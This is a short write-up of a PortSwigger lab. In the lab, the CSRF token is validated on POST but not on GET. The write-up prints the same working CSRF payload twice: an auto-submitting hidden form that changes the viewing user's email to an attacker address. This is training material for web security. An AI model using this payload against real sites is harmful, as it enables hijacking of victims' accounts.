# Lab: CSRF where token validation depends on request method (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

Credentials: `wiener:peter`

## Vulnerability
CSRF token is validated on POST but not on GET.

## Solution

Convert change-email to GET (no token required):

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Final Exploit Payload
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
